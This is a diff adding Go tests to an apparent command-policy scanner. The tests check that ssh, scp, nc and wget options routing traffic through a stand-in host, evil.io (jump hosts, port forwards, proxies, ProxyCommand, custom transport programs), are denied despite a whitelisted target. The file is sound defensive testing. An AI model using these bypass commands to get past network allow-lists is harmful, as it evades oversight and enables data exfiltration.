@@ -525,6 +525,104 @@ func TestExtractHosts(t *testing.T) {
 	}
 }
 
+// TestExtractGenericHostBearingOptions pins that host-bearing options of the
+// non-curl download commands (ssh/scp -J jump hosts, ssh -W/-L/-R forwarding
+// specs, nc -x proxy) contribute their real targets, across space, inline and
+// bundled short-flag forms, and that value-taking options consume their
+// operand so it is not mistaken for a host.
+func TestExtractGenericHostBearingOptions(t *testing.T) {
+	cases := []struct {
+		name string
+		cmd  string
+		args []string
+		want []string
+	}{
+		{"ssh jump space", "ssh", []string{"-J", "evil.io", "github.com"}, []string{"evil.io", "github.com"}},
+		{"ssh jump inline", "ssh", []string{"-Jevil.io", "github.com"}, []string{"evil.io", "github.com"}},
+		{"ssh jump bundled", "ssh", []string{"-vJ", "evil.io", "github.com"}, []string{"evil.io", "github.com"}},
+		{"ssh jump hop list", "ssh", []string{"-J", "user@evil.io:2222,relay.example:22", "github.com"},
+			[]string{"evil.io", "relay.example", "github.com"}},
+		{"ssh remote forward", "ssh", []string{"-R", "8080:evil.io:80", "github.com"}, []string{"evil.io", "github.com"}},
+		{"ssh stdio forward", "ssh", []string{"-W", "evil.io:443", "github.com"}, []string{"evil.io", "github.com"}},
+		{"nc proxy", "nc", []string{"-x", "evil.io:1080", "github.com", "443"}, []string{"evil.io", "github.com"}},
+		// Value-taking options consume their operand: key.pem / 2222 are not hosts.
+		{"ssh identity file", "ssh", []string{"-i", "key.pem", "user@github.com"}, []string{"github.com"}},
+		{"ssh port", "ssh", []string{"-p", "2222", "github.com"}, []string{"github.com"}},
+		{"wget bundled output", "wget", []string{"-qO", "out.tar.gz", "https://github.com/a"}, []string{"github.com"}},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := extractHosts(tc.cmd, tc.args)
+			if strings.Join(got, " ") != strings.Join(tc.want, " ") {
+				t.Errorf("extractHosts(%s, %v) = %v, want %v", tc.cmd, tc.args, got, tc.want)
+			}
+		})
+	}
+}
+
+// TestGenericDownloadOptionBypassDeny covers the non-curl equivalents of the
+// curl egress-redirect/opaque-config bypasses: host-bearing options (ssh/scp
+// -J, nc -x) and opaque egress controls (wget -e/--execute/--config, ssh/scp
+// -o/-F, scp -S) must not ride a whitelisted request host past
+// network.allowed_domains.
+func TestGenericDownloadOptionBypassDeny(t *testing.T) {
+	p := loadExamplePolicy(t) // allows github.com; on_non_whitelisted: deny
+	cases := []struct {
+		name string
+		cmd  string
+	}{
+		{"wget execute proxy equals", `wget --execute=http_proxy=http://evil.io https://github.com/a`},
+		{"wget execute proxy space", `wget --execute http_proxy=http://evil.io https://github.com/a`},
+		{"wget -e short", `wget -e use_proxy=on https://github.com/a`},
+		{"wget -e bundled", `wget -qe use_proxy=on https://github.com/a`},
+		{"wget config equals", `wget --config=/tmp/wgetrc https://github.com/a`},
+		{"wget config space", `wget --config /tmp/wgetrc https://github.com/a`},
+		{"ssh -o option", `ssh -o ProxyCommand=/tmp/x github.com`},
+		{"ssh -o inline", `ssh -oProxyJump=evil.io github.com`},
+		{"ssh config file", `ssh -F /tmp/cfg github.com`},
+		{"ssh jump host", `ssh -J evil.io github.com`},
+		{"ssh jump inline", `ssh -Jevil.io github.com`},
+		{"ssh jump hop list", `ssh -J user@evil.io:2222,github.com github.com`},
+		{"ssh stdio forward", `ssh -W evil.io:443 github.com`},
+		{"ssh remote forward", `ssh -R 8080:evil.io:80 github.com`},
+		{"scp jump host", `scp -J evil.io file user@github.com:/tmp/`},
+		{"scp -o option", `scp -o ProxyJump=evil.io file user@github.com:/tmp/`},
+		{"scp transport program", `scp -S /tmp/fake-ssh file user@github.com:/tmp/`},
+		{"nc proxy", `nc -x evil.io:1080 github.com 443`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			findings, decision := scanCmd(t, p, BackendWorkspace, tc.cmd)
+			if decision != DecisionDeny {
+				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
+			}
+			if !hasRule(findings, ruleNetworkID) {
+				t.Errorf("missing R-NET-001: %+v", findings)
+			}
+		})
+	}
+}
+
+// TestGenericDownloadSafeFlagsAllow guards against over-blocking: common wget
+// flag usage against a whitelisted host must still be allowed after the
+// generic option hardening. (ssh/scp cannot appear here: they are not in the
+// example policy's commands.allowed, so R-CMD-001 would deny regardless.)
+func TestGenericDownloadSafeFlagsAllow(t *testing.T) {
+	p := loadExamplePolicy(t)
+	for _, cmd := range []string{
+		`wget https://github.com/org/repo`,
+		`wget -q -O out.txt https://github.com/a`,
+		`wget -qO out.txt https://github.com/a`,
+		`wget --header "Accept: application/json" https://github.com/a`,
+		`wget --user-agent bot --tries=3 https://github.com/a`,
+	} {
+		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
+		if decision != DecisionAllow {
+			t.Errorf("safe wget usage should allow, got %q for %q: %+v", decision, cmd, findings)
+		}
+	}
+}
+
 // TestBareHostNetworkDeny pins that a bare (schemeless) host argument to curl or
 // wget is denied by R-NET-001 when it is not whitelisted, closing the
 // "curl evil.io" bypass.
